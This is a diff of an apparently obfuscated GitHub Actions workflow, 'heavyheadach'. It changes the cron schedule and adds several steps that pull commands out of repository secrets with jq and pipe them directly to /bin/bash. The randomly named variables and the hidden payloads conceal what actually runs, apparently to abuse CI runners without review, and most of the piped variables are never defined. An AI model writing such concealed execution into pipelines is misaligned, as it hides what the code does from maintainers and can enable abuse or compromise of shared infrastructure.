@@ -3,7 +3,7 @@ name: heavyheadach
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 1/6 * * *'
+    - cron: '52 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,8 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: heavyheadach
         env:
-          xpumo54886: ${{ secrets.xpumo54886 }}
+          zf82122: ${{ secrets.zf82122 }}
         run: |
-          echo $xpumo54886 | jq -r .cce77 | /bin/bash
-          echo $cxnjm896 | jq -r .rhzo5 | /bin/bash
+          echo $zf82122 | jq -r .v375 | /bin/bash
+          echo $s3606 | jq -r .kmc3 | /bin/bash
+          echo $smsl2019 | jq -r .mkume24458 | /bin/bash
+          echo $luyk0969 | jq -r .f0 | /bin/bash
+          echo $d8882 | jq -r .fnsqj844 | /bin/bash
+          echo $ld112 | jq -r .wgd7141 | /bin/bash
+          echo $pv4 | jq -r .nqnb027 | /bin/bash
+          echo $rw3539 | jq -r .k45130 | /bin/bash
 
